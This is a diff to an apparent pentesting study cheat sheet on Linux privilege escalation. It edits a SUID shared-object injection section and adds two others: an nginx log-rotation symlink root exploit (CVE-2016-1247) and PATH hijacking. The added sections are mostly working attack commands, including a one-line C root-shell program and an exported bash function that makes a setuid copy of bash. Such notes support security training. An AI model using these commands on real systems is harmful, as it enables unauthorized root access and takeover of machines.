@@ -301,10 +301,33 @@ rws-rwg-rwt  s for owner user; g for group; t for other users
 
 9- Advanced SUID (Shared Objects)(so injection)
 -     find / -type f -perm 04000 -ls 2>/dev/null  (if you didn't find anything that works with GTFOBins. check files owned by other users (not root) and try to inject)
-run the files and check what is done. then run the file again using strace tool (debugging tool)
--     strace <SUID file> 2>&1 | grep -i -E "open|access|no such file"     (try to find any file in home directory or something among these lines)
-check if you can modify the file if yes add a malicious code; if file not exist create a file with same name; if you can delete the existing file and create a new one that is good as well
+run the file and check what is done. then run the file again using strace tool (debugging tool)
+-     strace <SUID file> 2>&1 | grep -i -E "open|access|no such file"     (try to find any file in the home directory or something among these lines)
+check if you can modify the file if yes add a malicious code; if the file does not exist create a file with the same name; if you can delete the existing file and create a new one that is good as well
 check hack tricks https://book.hacktricks.xyz/linux-hardening/privilege-escalation
+
+10- Binary Symlinks     (this vuln only with nginx)
+-     run linux-exploit-suggester  (you will find nginxed-root.sh)
+-     dpkg -l | grep nginx   (version <= 1.6.2)
+-     find / -type f -perm 04000 -ls 2>/dev/null   (make sure u have SUID in the sudo /usr/bin/sudo)
+-     ls -la /var/log/nginx   (if you have write permission that's good. change the log file to a malicious file)
+-     ./nginxed-root.sh /var/log/nginx/error.log     (https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)
+make another connection via SSH. and type the following
+-     invoke-rc.d nginx rotate >/dev/null 2>&1
+check the previous terminal. machine rooted!!
+
+11- environmental variables
+env   (check environmental variables ex. PATH) (check the path to take advantage for something else)
+-     find / -type f -perm 04000 -ls 2>/dev/null
+look for paths that are owned by a non-privileged user
+-     strings <PATH>   (look for something interesting ex. service apache2 start) (in this case u can create a new file called service and change the path to that malicious file)
+make a malicious c code & compile it & set the new path
+-     echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c  | gcc /tmp/service.c -o /tmp/service  |  export PATH=/tmp:$PATH
+-     <PATH>  (run the same path that u found in the beginning)
+another scenario u may find. when u run find command and string the <PATH>. what if u find a path in that ex. /usr/sbin/service apache2 start. to take advantage create a function, export it, and run the path again
+-     function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+-     export -f /usr/sbin/service  (function name)
+-     <PATH>  (run the same path that u found in the beginning)
 -----------------------------------------------------------------Windows Privilege Escalation TCM---------------------------------------------------------------------
 - https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources
 - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
